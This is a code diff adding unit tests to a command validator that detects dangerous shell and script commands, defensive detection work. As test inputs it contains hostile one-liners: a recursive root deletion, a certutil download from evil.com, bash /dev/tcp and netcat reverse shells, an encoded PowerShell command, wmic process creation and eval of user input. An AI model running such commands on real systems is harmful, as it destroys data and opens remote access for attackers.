@@ -164,5 +164,117 @@ describe('CommandValidator', () => {
       // Should detect multiple issues
       expect(findings.length).toBeGreaterThan(1);
     });
+
+    describe('Python execution patterns', () => {
+      it('should detect os.system()', async () => {
+        const validator = new CommandValidator(defaultConfig);
+        const command = 'os.system("rm -rf /")';
+
+        const findings = await validator.validate(command);
+
+        expect(findings.length).toBeGreaterThan(0);
+        expect(findings.some(f => f.pattern.subcategory === 'python_execution')).toBe(true);
+      });
+
+      it('should detect subprocess.Popen()', async () => {
+        const validator = new CommandValidator(defaultConfig);
+        const command = 'subprocess.Popen("whoami", shell=True)';
+
+        const findings = await validator.validate(command);
+
+        expect(findings.length).toBeGreaterThan(0);
+        expect(findings.some(f => f.pattern.subcategory === 'python_execution')).toBe(true);
+      });
+    });
+
+    describe('Node.js child_process patterns', () => {
+      it('should detect require("child_process")', async () => {
+        const validator = new CommandValidator(defaultConfig);
+        const command = 'require("child_process").exec("ls")';
+
+        const findings = await validator.validate(command);
+
+        expect(findings.length).toBeGreaterThan(0);
+        expect(findings.some(f => f.pattern.subcategory === 'nodejs_child_process')).toBe(true);
+      });
+    });
+
+    describe('PowerShell encoded patterns', () => {
+      it('should detect powershell -enc', async () => {
+        const validator = new CommandValidator(defaultConfig);
+        const command = 'powershell -enc SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuAA==';
+
+        const findings = await validator.validate(command);
+
+        expect(findings.length).toBeGreaterThan(0);
+        expect(findings.some(f => f.pattern.subcategory === 'powershell_encoded')).toBe(true);
+      });
+    });
+
+    describe('Windows LOLBins patterns', () => {
+      it('should detect certutil', async () => {
+        const validator = new CommandValidator(defaultConfig);
+        const command = 'certutil -urlcache -split -f http://evil.com payload.exe';
+
+        const findings = await validator.validate(command);
+
+        expect(findings.length).toBeGreaterThan(0);
+        expect(findings.some(f => f.pattern.subcategory === 'windows_lolbins')).toBe(true);
+      });
+
+      it('should detect wmic', async () => {
+        const validator = new CommandValidator(defaultConfig);
+        const command = 'wmic process call create "cmd.exe"';
+
+        const findings = await validator.validate(command);
+
+        expect(findings.length).toBeGreaterThan(0);
+        expect(findings.some(f => f.pattern.subcategory === 'windows_lolbins')).toBe(true);
+      });
+    });
+
+    describe('Reverse shell patterns', () => {
+      it('should detect bash reverse shell via /dev/tcp', async () => {
+        const validator = new CommandValidator(defaultConfig);
+        const command = 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1';
+
+        const findings = await validator.validate(command);
+
+        expect(findings.length).toBeGreaterThan(0);
+        expect(findings.some(f => f.pattern.subcategory === 'reverse_shell_devtcp')).toBe(true);
+      });
+
+      it('should detect netcat reverse shell', async () => {
+        const validator = new CommandValidator(defaultConfig);
+        const command = 'nc -e /bin/sh 10.0.0.1 4444';
+
+        const findings = await validator.validate(command);
+
+        expect(findings.length).toBeGreaterThan(0);
+        expect(findings.some(f => f.pattern.subcategory === 'reverse_shell_netcat')).toBe(true);
+      });
+
+      it('should detect /dev/tcp with IP pattern', async () => {
+        const validator = new CommandValidator(defaultConfig);
+        const command = 'exec 5<>/dev/tcp/192.168.1.1/8080';
+
+        const findings = await validator.validate(command);
+
+        expect(findings.length).toBeGreaterThan(0);
+        expect(findings.some(f => f.pattern.subcategory === 'reverse_shell_bash')).toBe(true);
+      });
+    });
+
+    describe('Shell eval patterns', () => {
+      it('should detect eval "$variable"', async () => {
+        const validator = new CommandValidator(defaultConfig);
+        const command = 'eval "$USER_INPUT"';
+
+        const findings = await validator.validate(command);
+
+        expect(findings.length).toBeGreaterThan(0);
+        expect(findings.some(f => f.pattern.subcategory === 'shell_eval')).toBe(true);
+      });
+    });
   });
 });
